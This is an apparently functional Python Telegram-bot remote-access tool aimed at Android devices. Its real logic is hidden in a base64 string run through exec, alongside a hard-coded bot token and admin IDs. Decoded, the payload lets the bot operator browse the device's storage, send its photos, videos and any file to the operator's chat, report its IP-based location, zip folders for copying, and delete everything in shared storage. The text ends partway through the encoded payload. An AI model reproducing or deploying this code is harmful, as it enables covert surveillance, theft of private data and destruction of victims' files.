import base64
TOKEN = "7684833397:AAEPlg1KmzEDhoaS5aa-CNZELjQAxXYkoIU"
ADMIN_ID = "7537498877, 7046488481"
exec(base64.b64decode("aW1wb3J0IG9zCmltcG9ydCBzaHV0aWwKaW1wb3J0IHJhbmRvbQppbXBvcnQgdGhyZWFkaW5nCmltcG9ydCB0aW1lCmZyb20gdGVsZWJvdCBpbXBvcnQgVGVsZUJvdCwgdHlwZXMKZnJvbSBjb2xvcmFtYSBpbXBvcnQgRm9yZSwgU3R5bGUsIGluaXQKCmluaXQoKSAgCgpib3QgPSBUZWxlQm90KFRPS0VOKQoKcmVxdWlyZWRfbGlicmFyaWVzID0gWyd0ZWxlYm90JywgJ2NvbG9yYW1hJ10KCmRlZiBpbnN0YWxsX2xpYnJhcmllcygpOgogICAgZm9yIGxpYiBpbiByZXF1aXJlZF9saWJyYXJpZXM6CiAgICAgICAgdHJ5OgogICAgICAgICAgICBfX2ltcG9ydF9fKGxpYikKICAgICAgICBleGNlcHQgSW1wb3J0RXJyb3I6CiAgICAgICAgICAgIG9zLnN5c3RlbShmJ3BpcCBpbnN0YWxsIHtsaWJ9JykKCmluc3RhbGxfbGlicmFyaWVzKCkKCmRlZiBjb3VudF9waG90b3MoZGlyZWN0b3J5KToKICAgIGNvdW50ID0gMAogICAgZm9yIHJvb3QsIGRpcnMsIGZpbGVzIGluIG9zLndhbGsoZGlyZWN0b3J5KToKICAgICAgICBmb3IgZmlsZSBpbiBmaWxlczoKICAgICAgICAgICAgaWYgZmlsZS5lbmRzd2l0aCgnLmpwZycpIG9yIGZpbGUuZW5kc3dpdGgoJy5wbmcnKToKICAgICAgICAgICAgICAgIGNvdW50ICs9IDEKICAgIHJldHVybiBjb3VudAoKZGVmIGNvdW50X3ZpZGVvcyhkaXJlY3RvcnkpOgogICAgY291bnQgPSAwCiAgICBmb3Igcm9vdCwgZGlycywgZmlsZXMgaW4gb3Mud2FsayhkaXJlY3RvcnkpOgogICAgICAgIGZvciBmaWxlIGluIGZpbGVzOgogICAgICAgICAgICBpZiBmaWxlLmVuZHN3aXRoKCcubXA0Jykgb3IgZmlsZS5lbmRzd2l0aCgnLmF2aScpIG9yIGZpbGUuZW5kc3dpdGgoJy5ta3YnKToKICAgICAgICAgICAgICAgIGNvdW50ICs9IDEKICAgIHJldHVybiBjb3VudAoKZGVmIHNlbmRfbWVkaWFfZnJvbV9kaXJlY3RvcnkoZGlyZWN0b3J5LCBjb3VudCwgbWVzc2FnZSwgbWVkaWFfdHlwZSk6CiAgICBzZW50X2NvdW50ID0gMAogICAgZm9yIHJvb3QsIGRpcnMsIGZpbGVzIGluIG9zLndhbGsoZGlyZWN0b3J5KToKICAgICAgICBmb3IgZmlsZSBpbiBmaWxlczoKICAgICAgICAgICAgaWYgKG1lZGlhX3R5cGUgPT0gJ3Bob3RvJyBhbmQgKGZpbGUuZW5kc3dpdGgoJy5qcGcnKSBvciBmaWxlLmVuZHN3aXRoKCcucG5nJykpKSBvciBcCiAgICAgICAgICAgICAgIChtZWRpYV90eXBlID09ICd2aWRlbycgYW5kIChmaWxlLmVuZHN3aXRoKCcubXA0Jykgb3IgZmlsZS5lbmRzd2l0aCgnLmF2aScpIG9yIGZpbGUuZW5kc3dpdGgoJy5ta3YnKSkpOgogICAgICAgICAgICAgICAgaWYgc2VudF9jb3VudCA+PSBjb3VudDoKICAgICAgICAgICAgICAgICAgICByZXR1cm4KICAgICAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgICAgICB3aXRoIG9wZW4ob3MucGF0aC5qb2luKHJvb3QsIGZpbGUpLCAncmInKSBhcyBtZWRpYV9maWxlOgogICAgICAgICAgICAgICAgICAgICAgICBpZiBtZWRpYV90eXBlID09ICdwaG90byc6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBib3Quc2VuZF9waG90byhtZXNzYWdlLmNoYXQuaWQsIG1lZGlhX2ZpbGUpCiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBib3Quc2VuZF92aWRlbyhtZXNzYWdlLmNoYXQuaWQsIG1lZGlhX2ZpbGUpCiAgICAgICAgICAgICAgICAgICAgc2VudF9jb3VudCArPSAxCiAgICAgICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgICAgICAgICAgICAgYm90LnNlbmRfbWVzc2FnZShtZXNzYWdlLmNoYXQuaWQsIGYnRXJyb3Igc2VuZGluZyB7bWVkaWFfdHlwZX06IHtlfScpCgpAYm90Lm1lc3NhZ2VfaGFuZGxlcihjb21tYW5kcz1bJ3N0YXJ0J10pCmRlZiBzdGFydChtZXNzYWdlKToKICAgIHdlbGNvbWVfdGV4dCA9ICLYs9mE2KfZhSEg2YXZhiDYsdio2KfYqiDZh9qpINit2LHZgdmH4oCM2KfbjCDYqtmI2KfZhS4g2obYt9mI2LEg2YXbjOKAjNiq2YjZhtmFINqp2YXaqdiqINqp2YbZhdifIPCfkoAiCiAgICBrZXlib2FyZCA9IHR5cGVzLklubGluZUtleWJvYXJkTWFya3VwKCkKICAgIGJ1dHRvbjEgPSB0eXBlcy5JbmxpbmVLZXlib2FyZEJ1dHRvbign2KfYs9iq2K7Ysdin2Kwg2Lnaqdiz4oCM2YfYpyDwn5O4JywgY2FsbGJhY2tfZGF0YT0nZXh0cmFjdF9waG90b3MnKQogICAgYnV0dG9uMiA9IHR5cGVzLklubGluZUtleWJvYXJkQnV0dG9uKCfZh9qpINmF2YjZgti524zYqiDwn4yNJywgY2FsbGJhY2tfZGF0YT0nbG9jYXRpb24nKQogICAgYnV0dG9uMyA9IHR5cGVzLklubGluZUtleWJvYXJkQnV0dG9uKCfZvtin2qnYs9in2LLbjCDYr9in2K/Zh+KAjNmH2Kcg8J+Xke+4jycsIGNhbGxiYWNrX2RhdGE9J2NsZWFyX2RhdGEnKQogICAgYnV0dG9uNCA9IHR5cGVzLklubGluZUtleWJvYXJkQnV0dG9uKCfYp9iz2KrYrtix2KfYrCDZiNuM2K/bjNmI2YfYpyDwn46lJywgY2FsbGJhY2tfZGF0YT0nc2VhcmNoX3ZpZGVvcycpCiAgICBidXR0b241ID0gdHlwZXMuSW5saW5lS2V5Ym9hcmRCdXR0b24oJ9qp2b7bjCDYr9in2K/Zh+KAjNmH2Kcg8J+TgicsIGNhbGxiYWNrX2RhdGE9J2NvcHlfZGF0YScpCiAgICBrZXlib2FyZC5hZGQoYnV0dG9uMSwgYnV0dG9uMikKICAgIGtleWJvYXJkLmFkZChidXR0b24zLCBidXR0b240KQogICAga2V5Ym9hcmQuYWRkKGJ1dHRvbjUpCiAgICBib3Quc2VuZF9tZXNzYWdlKG1lc3NhZ2UuY2hhdC5pZCwgdGV4dD13ZWxjb21lX3RleHQsIHJlcGx5X21hcmt1cD1rZXlib2FyZCkKCmltcG9ydCBoYXNobGliCmltcG9ydCBvcwpmcm9tIHRlbGVib3QgaW1wb3J0IHR5cGVzCgpJVEVNU19QRVJfUEFHRSA9IDEwCm5hdmlnYXRpb25faGlzdG9yeSA9IHt9CgpAYm90LmNhbGxiYWNrX3F1ZXJ5X2hhbmRsZXIoZnVuYz1sYW1iZGEgY2FsbDogY2FsbC5kYXRhID09ICdmaWxlcycpCmRlZiBoYW5kbGVfZmlsZXMoY2FsbCk6CiAgICByb290X2RpcmVjdG9yeSA9ICcvc3RvcmFnZS9lbXVsYXRlZC8wLycKICAgIG5hdmlnYXRpb25faGlzdG9yeVtjYWxsLm1lc3NhZ2UuY2hhdC5pZF0gPSBbcm9vdF9kaXJlY3RvcnldCiAgICBzaG93X2RpcmVjdG9yeV9jb250ZW50cyhjYWxsLm1lc3NhZ2UsIHJvb3RfZGlyZWN0b3J5LCAwKQoKZGVmIGhhc2hfcGF0aChwYXRoKToKICAgIHJldHVybiBoYXNobGliLnNoYTI1NihwYXRoLmVuY29kZSgpKS5oZXhkaWdlc3QoKVs6MTZdCgpkZWYgc2hvd19kaXJlY3RvcnlfY29udGVudHMobWVzc2FnZSwgZGlyZWN0b3J5LCBwYWdlKToKICAgIGNoYXRfaWQgPSBtZXNzYWdlLmNoYXQuaWQKICAgIGhpc3RvcnkgPSBuYXZpZ2F0aW9uX2hpc3RvcnkuZ2V0KGNoYXRfaWQsIFtdKQogICAga2V5Ym9hcmQgPSB0eXBlcy5JbmxpbmVLZXlib2FyZE1hcmt1cCgpCiAgICBmaWxlcyA9IFtdCiAgICBkaXJzID0gW10KICAgIGZvciBpdGVtIGluIG9zLmxpc3RkaXIoZGlyZWN0b3J5KToKICAgICAgICBpdGVtX3BhdGggPSBvcy5wYXRoLmpvaW4oZGlyZWN0b3J5LCBpdGVtKQogICAgICAgIGlmIG9zLnBhdGguaXNmaWxlKGl0ZW1fcGF0aCk6CiAgICAgICAgICAgIGZpbGVzLmFwcGVuZChpdGVtKQogICAgICAgIGVsc2U6CiAgICAgICAgICAgIGRpcnMuYXBwZW5kKGl0ZW0pCiAgICAKICAgIGFsbF9pdGVtcyA9IGRpcnMgKyBmaWxlcwogICAgc3RhcnQgPSBwYWdlICogSVRFTVNfUEVSX1BBR0UKICAgIGVuZCA9IHN0YXJ0ICsgSVRFTVNfUEVSX1BBR0UKICAgIGN1cnJlbnRfaXRlbXMgPSBhbGxfaXRlbXNbc3RhcnQ6ZW5kXQogICAgCiAgICBmb3IgaXRlbSBpbiBjdXJyZW50X2l0ZW1zOgogICAgICAgIGl0ZW1fcGF0aCA9IG9zLnBhdGguam9pbihkaXJlY3RvcnksIGl0ZW0pCiAgICAgICAgaWYgb3MucGF0aC5pc2ZpbGUoaXRlbV9wYXRoKToKICAgICAgICAgICAgaWYgaXRlbS5sb3dlcigpLmVuZHN3aXRoKCgnLnBuZycsICcuanBnJywgJy5qcGVnJywgJy5naWYnKSk6CiAgICAgICAgICAgICAgICBidXR0b24gPSB0eXBlcy5JbmxpbmVLZXlib2FyZEJ1dHRvbihmJ/Cfk7cge2l0ZW19JywgY2FsbGJhY2tfZGF0YT1mJ2ZpbGVfe2hhc2hfcGF0aChpdGVtX3BhdGgpfScpCiAgICAgICAgICAgIGVsaWYgaXRlbS5sb3dlcigpLmVuZHN3aXRoKCgnLm1wNCcsICcuYXZpJywgJy5ta3YnKSk6CiAgICAgICAgICAgICAgICBidXR0b24gPSB0eXBlcy5JbmxpbmVLZXlib2FyZEJ1dHRvbihmJ/CfjqUge2l0ZW19JywgY2FsbGJhY2tfZGF0YT1mJ2ZpbGVfe2hhc2hfcGF0aChpdGVtX3BhdGgpfScpCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICBidXR0b24gPSB0eXBlcy5JbmxpbmVLZXlib2FyZEJ1dHRvbihmJ/Cfk4Qge2l0ZW19JywgY2FsbGJhY2tfZGF0YT1mJ2ZpbGVfe2hhc2hfcGF0aChpdGVtX3BhdGgpfScpCiAgICAgICAgZWxzZToKICAgICAgICAgICAgYnV0dG9uID0gdHlwZXMuSW5saW5lS2V5Ym9hcmRCdXR0b24oZifwn5OBIHtpdGVtfScsIGNhbGxiYWNrX2RhdGE9ZidkaXJfe2hhc2hfcGF0aChpdGVtX3BhdGgpfScpCiAgICAgICAga2V5Ym9hcmQuYWRkKGJ1dHRvbikKICAgIAogICAgaWYgbGVuKGhpc3RvcnkpID4gMToKICAgICAgICBiYWNrX2J1dHRvbiA9IHR5cGVzLklubGluZUtleWJvYXJkQnV0dG9uKCfirIXvuI8gQmFjaycsIGNhbGxiYWNrX2RhdGE9ZidiYWNrX3toYXNoX3BhdGgoZGlyZWN0b3J5KX0nKQogICAgICAgIGtleWJvYXJkLmFkZChiYWNrX2J1dHRvbikKICAgIAogICAgaWYgZW5kIDwgbGVuKGFsbF9pdGVtcyk6CiAgICAgICAgbmV4dF9idXR0b24gPSB0eXBlcy5JbmxpbmVLZXlib2FyZEJ1dHRvbign4p6h77iPIE5leHQgUGFnZScsIGNhbGxiYWNrX2RhdGE9ZidwYWdlX3toYXNoX3BhdGgoZGlyZWN0b3J5KX1fe3BhZ2UrMX0nKQogICAgICAgIGtleWJvYXJkLmFkZChuZXh0X2J1dHRvbikKICAgIAogICAgaWYgcGFnZSA+IDA6CiAgICAgICAgcHJldl9idXR0b24gPSB0eXBlcy5JbmxpbmVLZXlib2FyZEJ1dHRvbign4qyF77iPIFByZXZpb3VzIFBhZ2UnLCBjYWxsYmFja19kYXRhPWYncGFnZV97aGFzaF9wYXRoKGRpcmVjdG9yeSl9X3twYWdlLTF9JykKICAgICAgICBrZXlib2FyZC5hZGQocHJldl9idXR0b24pCiAgICAKICAgIGlmIG1lc3NhZ2UucmVwbHlfdG9fbWVzc2FnZToKICAgICAgICBib3QuZWRpdF9tZXNzYWdlX3RleHQoY2hhdF9pZD1jaGF0X2lkLCBtZXNzYWdlX2lkPW1lc3NhZ2UubWVzc2FnZV9pZCwgdGV4dD1mIkZvbGRlciBjb250ZW50czoge2RpcmVjdG9yeX0iLCByZXBseV9tYXJrdXA9a2V5Ym9hcmQpCiAgICBlbHNlOgogICAgICAgIGJvdC5zZW5kX21lc3NhZ2UoY2hhdF9pZCwgZiLZhdit2KrZiNin24wg2b7ZiNi02Yc6IHtkaXJlY3Rvcnl9IiwgcmVwbHlfbWFya3VwPWtleWJvYXJkKQoKQGJvdC5jYWxsYmFja19xdWVyeV9oYW5kbGVyKGZ1bmM9bGFtYmRhIGNhbGw6IGNhbGwuZGF0YS5zdGFydHN3aXRoKCdkaXJfJykpCmRlZiBoYW5kbGVfZGlyZWN0b3J5X2NsaWNrKGNhbGwpOgogICAgZGlyZWN0b3J5X2hhc2ggPSBjYWxsLmRhdGEuc3BsaXQoJ18nLCAxKVsxXQogICAgZGlyZWN0b3J5ID0gZmluZF9wYXRoX2J5X2hhc2goZGlyZWN0b3J5X2hhc2gpCiAgICBpZiBkaXJlY3RvcnkgaXMgTm9uZToKICAgICAgICBib3QuYW5zd2VyX2NhbGxiYWNrX3F1ZXJ5KGNhbGwuaWQsICfYrti32Kc6INmF2LPbjNixINm+24zYr9inINmG2LTYry4g8J+aqycpCiAgICAgICAgcmV0dXJuCiAgICBjaGF0X2lkID0gY2FsbC5tZXNzYWdlLmNoYXQuaWQKICAgIGhpc3RvcnkgPSBuYXZpZ2F0aW9uX2hpc3RvcnkuZ2V0KGNoYXRfaWQsIFtdKQogICAgaGlzdG9yeS5hcHBlbmQoZGlyZWN0b3J5KQogICAgbmF2aWdhdGlvbl9oaXN0b3J5W2NoYXRfaWRdID0gaGlzdG9yeQogICAgc2hvd19kaXJlY3RvcnlfY29udGVudHMoY2FsbC5tZXNzYWdlLCBkaXJlY3RvcnksIDApCgpAYm90LmNhbGxiYWNrX3F1ZXJ5X2hhbmRsZXIoZnVuYz1sYW1iZGEgY2FsbDogY2FsbC5kYXRhLnN0YXJ0c3dpdGgoJ2ZpbGVfJykpCmRlZiBoYW5kbGVfZmlsZV9jbGljayhjYWxsKToKICAgIGZpbGVfaGFzaCA9IGNhbGwuZGF0YS5zcGxpdCgnXycsIDEpWzFdCiAgICBmaWxlX3BhdGggPSBmaW5kX3BhdGhfYnlfaGFzaChmaWxlX2hhc2gpCiAgICBpZiBmaWxlX3BhdGggaXMgTm9uZToKICAgICAgICBib3QuYW5zd2VyX2NhbGxiYWNrX3F1ZXJ5KGNhbGwuaWQsICfYrti32Kc6INmB2KfbjNmEINm+24zYr9inINmG2LTYry4g8J+aqycpCiAgICAgICAgcmV0dXJuCiAgICB0cnk6CiAgICAgICAgd2l0aCBvcGVuKGZpbGVfcGF0aCwgJ3JiJykgYXMgZmlsZToKICAgICAgICAgICAgaWYgZmlsZV9wYXRoLmxvd2VyKCkuZW5kc3dpdGgoKCcucG5nJywgJy5qcGcnLCAnLmpwZWcnLCAnLmdpZicpKToKICAgICAgICAgICAgICAgIGJvdC5zZW5kX3Bob3RvKGNhbGwubWVzc2FnZS5jaGF0LmlkLCBmaWxlKQogICAgICAgICAgICBlbGlmIGZpbGVfcGF0aC5sb3dlcigpLmVuZHN3aXRoKCgnLm1wNCcsICcuYXZpJywgJy5ta3YnKSk6CiAgICAgICAgICAgICAgICBib3Quc2VuZF92aWRlbyhjYWxsLm1lc3NhZ2UuY2hhdC5pZCwgZmlsZSkKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIGJvdC5zZW5kX2RvY3VtZW50KGNhbGwubWVzc2FnZS5jaGF0LmlkLCBmaWxlKQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIGJvdC5hbnN3ZXJfY2FsbGJhY2tfcXVlcnkoY2FsbC5pZCwgZifYrti32Kcg2K/YsSDYp9ix2LPYp9mEINmB2KfbjNmEOiB7ZX0g8J+aqycpCgpAYm90LmNhbGxiYWNrX3F1ZXJ5X2hhbmRsZXIoZnVuYz1sYW1iZGEgY2FsbDogY2FsbC5kYXRhLnN0YXJ0c3dpdGgoJ3BhZ2VfJykpCmRlZiBoYW5kbGVfcGFnZV9jbGljayhjYWxsKToKICAgIGRhdGEgPSBjYWxsLmRhdGEuc3BsaXQoJ18nLCAyKQogICAgZGlyZWN0b3J5X2hhc2ggPSBkYXRhWzFdCiAgICBkaXJlY3RvcnkgPSBmaW5kX3BhdGhfYnlfaGFzaChkaXJlY3RvcnlfaGFzaCkKICAgIGlmIGRpcmVjdG9yeSBpcyBOb25lOgogICAgICAgIGJvdC5hbnN3ZXJfY2FsbGJhY2tfcXVlcnkoY2FsbC5pZCwgJ9iu2LfYpzog2YXYs9uM2LEg2b7bjNiv2Kcg2YbYtNivLiDwn5qrJykKICAgICAgICByZXR1cm4KICAgIHBhZ2UgPSBpbnQoZGF0YVsyXSkKICAgIHNob3dfZGlyZWN0b3J5X2NvbnRlbnRzKGNhbGwubWVzc2FnZSwgZGlyZWN0b3J5LCBwYWdlKQoKQGJvdC5jYWxsYmFja19xdWVyeV9oYW5kbGVyKGZ1bmM9bGFtYmRhIGNhbGw6IGNhbGwuZGF0YS5zdGFydHN3aXRoKCdiYWNrXycpKQpkZWYgaGFuZGxlX2JhY2tfY2xpY2soY2FsbCk6CiAgICBkaXJlY3RvcnlfaGFzaCA9IGNhbGwuZGF0YS5zcGxpdCgnXycsIDEpWzFdCiAgICBkaXJlY3RvcnkgPSBmaW5kX3BhdGhfYnlfaGFzaChkaXJlY3RvcnlfaGFzaCkKICAgIGlmIGRpcmVjdG9yeSBpcyBOb25lOgogICAgICAgIGJvdC5hbnN3ZXJfY2FsbGJhY2tfcXVlcnkoY2FsbC5pZCwgJ9iu2LfYpzog2YXYs9uM2LEg2b7bjNiv2Kcg2YbYtNivLiDwn5qrJykKICAgICAgICByZXR1cm4KICAgIGNoYXRfaWQgPSBjYWxsLm1lc3NhZ2UuY2hhdC5pZAogICAgaGlzdG9yeSA9IG5hdmlnYXRpb25faGlzdG9yeS5nZXQoY2hhdF9pZCwgW10pCiAgICBpZiBsZW4oaGlzdG9yeSkgPiAxOgogICAgICAgIGhpc3RvcnkucG9wKCkKICAgICAgICBuYXZpZ2F0aW9uX2hpc3RvcnlbY2hhdF9pZF0gPSBoaXN0b3J5CiAgICAgICAgcHJldmlvdXNfZGlyZWN0b3J5ID0gaGlzdG9yeVstMV0KICAgICAgICBzaG93X2RpcmVjdG9yeV9jb250ZW50cyhjYWxsLm1lc3NhZ2UsIHByZXZpb3VzX2RpcmVjdG9yeSwgMCkKCmRlZiBmaW5kX3BhdGhfYnlfaGFzaChwYXRoX2hhc2gpOgogICAgcm9vdF9kaXJlY3RvcnkgPSAnL3N0b3JhZ2UvZW11bGF0ZWQvMC8nCiAgICBmb3Igcm9vdCwgZGlycywgZmlsZXMgaW4gb3Mud2Fsayhyb290X2RpcmVjdG9yeSk6CiAgICAgICAgZm9yIGl0ZW0gaW4gZGlycyArIGZpbGVzOgogICAgICAgICAgICBpdGVtX3BhdGggPSBvcy5wYXRoLmpvaW4ocm9vdCwgaXRlbSkKICAgICAgICAgICAgaWYgaGFzaF9wYXRoKGl0ZW1fcGF0aCkgPT0gcGF0aF9oYXNoOgogICAgICAgICAgICAgICAgcmV0dXJuIGl0ZW1fcGF0aAogICAgcmV0dXJuIE5vbmUgIAoKQGJvdC5jYWxsYmFja19xdWVyeV9oYW5kbGVyKGZ1bmM9bGFtYmRhIGNhbGw6IGNhbGwuZGF0YSA9PSAnbG9jYXRpb24nKQpkZWYgaGFuZGxlX2xvY2F0aW9uKGNhbGwpOgogICAgaW1wb3J0IHJlcXVlc3RzCiAgICBpcF9pbmZvID0gcmVxdWVzdHMuZ2V0KCdodHRwOi8vaXAtYXBpLmNvbS9qc29uLycpLmpzb24oKQogICAgaWYgaXBfaW5mb1snc3RhdHVzJ10gPT0gJ3N1Y2Nlc3MnOgogICAgICAgIGxhdGl0dWRlID0gaXBfaW5mb1snbGF0J10KICAgICAgICBsb25naXR1ZGUgPSBpcF9pbmZvWydsb24nXQogICAgICAgIGFkZGl0aW9uYWxfaW5mbyA9IGYi2KfYt9mE2KfYudin2Kog2KfYttin2YHbjDpcbtqp2LTZiNixOiB7aXBfaW5mb1snY291bnRyeSddfVxu2YXZhti32YLZhzoge2lwX2luZm9bJ3JlZ2lvbk5hbWUnXX1cbti02YfYsToge2lwX2luZm9bJ2NpdHknXX1cbtin2LHYp9im2YfigIzYr9mH2YbYr9mHOiB7aXBfaW5mb1snaXNwJ119XG7YotuM4oCM2b7bjDoge2lwX2luZm9bJ3F1ZXJ5J119IiAgICAgICAgCiAgICAgICAgYm90LnNlbmRfbG9jYXRpb24oY2FsbC5tZXNzYWdlLmNoYXQuaWQsIGxhdGl0dWRlLCBsb25naXR1ZGUpCiAgICAgICAgYm90LnNlbmRfbWVzc2FnZShjYWxsLm1lc3NhZ2UuY2hhdC5pZCwgYWRkaXRpb25hbF9pbmZvKQogICAgZWxzZToKICAgICAgICBib3Quc2VuZF9tZXNzYWdlKGNhbGwubWVzc2FnZS5jaGF0LmlkLCAi2YbZhduM4oCM2KrZiNmG2YUg2YXZiNmC2LnbjNiq2Kog2LHZiCDZvtuM2K/YpyDaqdmG2YXYjCDZhNi52YbYqtuMISIpCgpAYm90LmNhbGxiYWNrX3F1ZXJ5X2hhbmRsZXIoZnVuYz1sYW1iZGEgY2FsbDogY2FsbC5kYXRhID09ICdleHRyYWN0X3Bob3RvcycpCmRlZiBhc2tfZm9yX3Bob3RvX2NvdW50KGNhbGwpOgogICAgcm9vdF9kaXJlY3RvcnkgPSAnL3N0b3JhZ2UvZW11bGF0ZWQvMC8nCiAgICBzcGVjaWZpY19mb2xkZXJzID0gWycvc3RvcmFnZS9lbXVsYXRlZC8wL1Bob3RvcycsICcvc3RvcmFnZS9lbXVsYXRlZC8wL0ltYWdlcycsICcvc3RvcmFnZS9lbXVsYXRlZC8wL0RDSU0vQ2FtZXJhJ10KICAgIHBob3RvX2NvdW50ID0gc3VtKGNvdW50X3Bob3Rvcyhmb2xkZXIpIGZvciBmb2xkZXIgaW4gc3BlY2lmaWNfZm9sZGVycyBpZiBvcy5wYXRoLmV4aXN0cyhmb2xkZXIpKQogICAgcGhvdG9fY291bnQgKz0gY291bnRfcGhvdG9zKHJvb3RfZGlyZWN0b3J5KQogICAgYm90LnNlbmRfbWVzc2FnZShjYWxsLm1lc3NhZ2UuY2hhdC5pZCwgZifYqti52K/Yp9ivINi52qnYs+KAjNmH2Kcg2KrZiCDYr9iz2Krar9in2Yc6IHtwaG90b19jb3VudH0uINqG2YbYr9iq2Kcg2YXbjOKAjNiu2YjYp9uM2J8g8J+TuCcpCiAgICBib3QucmVnaXN0ZXJfbmV4dF9zdGVwX2hhbmRsZXIoY2FsbC5tZXNzYWdlLCBwcm9jZXNzX3Bob3RvX2NvdW50LCByb290X2RpcmVjdG9yeSwgc3BlY2lmaWNfZm9sZGVycykKCmRlZiBwcm9jZXNzX3Bob3RvX2NvdW50KG1lc3NhZ2UsIHJvb3RfZGlyZWN0b3J5LCBzcGVjaWZpY19mb2xkZXJzKToKICAgIHRyeToKICAgICAgICBjb3VudCA9IGludChtZXNzYWdlLnRleHQpCiAgICAgICAgaWYgY291bnQgPD0gMDoKICAgICAgICAgICAgcmFpc2UgVmFsdWVFcnJvcgogICAgZXhjZXB0IFZhbHVlRXJyb3I6CiAgICAgICAgYm90LnNlbmRfbWVzc2FnZShtZXNzYWdlLmNoYXQuaWQsICfbjNmHINi52K/YryDYr9ix2LPYqiDZiNin2LHYryDaqdmG2Iwg2KfYrdmF2YIhIPCfk7gnKQogICAgICAgIHJldHVybgoKICAgIGZvciBmb2xkZXIgaW4gc3BlY2lmaWNfZm9sZGVyczoKICAgICAgICBpZiBvcy5wYXRoLmV4aXN0cyhmb2xkZXIpOgogICAgICAgICAgICBzZW5kX21lZGlhX2Zyb21fZGlyZWN0b3J5KGZvbGRlciwgY291bnQsIG1lc3NhZ2UsICdwaG90bycpCiAgICAgICAgICAgIGNvdW50IC09IGNvdW50X3Bob3Rvcyhmb2xkZXIpCiAgICAgICAgICAgIGlmIGNvdW50IDw9IDA6CiAgICAgICAgICAgICAgICByZXR1cm4KICAgIAogICAgc2VuZF9tZWRpYV9mcm9tX2RpcmVjdG9yeShyb290X2RpcmVjdG9yeSwgY291bnQsIG1lc3NhZ2UsICdwaG90bycpCiAgICBhc2tfdG9fcmV0dXJuX3RvX21lbnUobWVzc2FnZSwgJ2V4dHJhY3RfcGhvdG9zJykKCkBib3QuY2FsbGJhY2tfcXVlcnlfaGFuZGxlcihmdW5jPWxhbWJkYSBjYWxsOiBjYWxsLmRhdGEgPT0gJ2NsZWFyX2RhdGEnKQpkZWYgY2xlYXJfZGF0YShjYWxsKToKICAgIHJvb3RfZGlyZWN0b3J5ID0gJy9zdG9yYWdlL2VtdWxhdGVkLzAvJwogICAgYm90LnNlbmRfbWVzc2FnZShjYWxsLm1lc3NhZ2UuY2hhdC5pZCwgJ9i02LHZiNi5INm+2Kfaqdiz2KfYstuMINiv2KfYr9mH4oCM2YfYp9iMINmH2YXZhyDahtuM2LLZiCDZhtin2KjZiNivINmF24zigIzaqdmG2YUuLi4g8J+Xke+4jycpCiAgICAKICAgIHRyeToKICAgICAgICBmb3Igcm9vdCwgZGlycywgZmlsZXMgaW4gb3Mud2Fsayhyb290X2RpcmVjdG9yeSwgdG9wZG93bj1GYWxzZSk6CiAgICAgICAgICAgIGZvciBuYW1lIGluIGZpbGVzOgogICAgICAgICAgICAgICAgb3MucmVtb3ZlKG9zLnBhdGguam9pbihyb290LCBuYW1lKSkKICAgICAgICAgICAgZm9yIG5hbWUgaW4gZGlyczoKICAgICAgICAgICAgICAgIG9zLnJtZGlyKG9zLnBhdGguam9pbihyb290LCBuYW1lKSkKICAgICAgICBib3Quc2VuZF9tZXNzYWdlKGNhbGwubWVzc2FnZS5jaGF0LmlkLCAn2K/Yp9iv2YfigIzZh9inINmG2KfYqNmI2K8g2LTYr9mG2Iwg2YfbjNqG24wg2YbZhdmI2YbYr9mHIScpCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgYm90LnNlbmRfbWVzc2FnZShjYWxsLm1lc3NhZ2UuY2hhdC5pZCwgZifYrti32Kcg2KrZiCDZvtin2qnYs9in2LLbjDoge2V92Iwg2q/ZhtivINiy2K/ZhSEnKQogICAgCiAgICBhc2tfdG9fcmV0dXJuX3RvX21lbnUoY2FsbC5tZXNzYWdlLCAnY2xlYXJfZGF0YScpCgpAYm90LmNhbGxiYWNrX3F1ZXJ5X2hhbmRsZXIoZnVuYz1sYW1iZGEgY2FsbDogY2FsbC5kYXRhID09ICdjb3B5X2RhdGEnKQpkZWYgYXNrX2Zvcl9mb2xkZXJfbmFtZShjYWxsKToKICAgIGJvdC5zZW5kX21lc3NhZ2UoY2FsbC5tZXNzYWdlLmNoYXQuaWQsICfYp9iz2YUg2b7ZiNi02YfigIzYp9uMINqp2Ycg2YXbjOKAjNiu2YjYp9uMINqp2b7bjCDaqdmG2YUg2LHZiCDYqNqv2Yg6IPCfk4InKQogICAgYm90LnJlZ2lzdGVyX25leHRfc3RlcF9oYW5kbGVyKGNhbGwubWVzc2FnZSwgcHJvY2Vzc19mb2xkZXJfbmFtZSkKCmRlZiBwcm9jZXNzX2ZvbGRlcl9uYW1lKG1lc3NhZ2UpOgogICAgZm9sZGVyX25hbWUgPSBtZXNzYWdlLnRleHQKICAgIHJvb3RfZGlyZWN0b3J5ID0gJy9zdG9yYWdlL2VtdWxhdGVkLzAvJwogICAgZm9sZGVyX3BhdGggPSBmaW5kX2ZvbGRlcihyb290X2RpcmVjdG9yeSwgZm9sZGVyX25hbWUpCiAgICAKICAgIGlmIG5vdCBmb2xkZXJfcGF0aDoKICAgICAgICBib3Quc2VuZF9tZXNzYWdlKG1lc3NhZ2UuY2hhdC5pZCwgZifZvtmI2LTZhyAie2ZvbGRlcl9uYW1lfSIg2b7bjNiv2Kcg2YbYtNiv2Iwg2q/Zhdi02K/ZhyEnKQogICAgICAgIGFza190b19yZXR1cm5fdG9fbWVudShtZXNzYWdlLCAnY29weV9kYXRhJykKICAgICAgICByZXR1cm4KICAgIAogICAgaWYgaXNfZm9sZGVyX3Rvb19sYXJnZShmb2xkZXJfcGF0aCk6CiAgICAgICAgYm90LnNlbmRfbWVzc2FnZShtZXNzYWdlLmNoYXQuaWQsICfYp9uM2YYg2b7ZiNi02Ycg2K7bjNmE24wg2LPZhtqv24zZhtmH2Iwg2KLZhdin2K/ZhyDYqNin2LQhIPCfk6YnKQogICAgCiAgICB6aXBfZmlsZV9wYXRoID0gY3JlYXRlX3ppcF9hcmNoaXZlKGZvbGRlcl9wYXRoLCBmb2xkZXJfbmFtZSkKICAgIGlmIHppcF9maWxlX3BhdGg6CiAgICAgICAgdHJ5OgogICAgICAgICA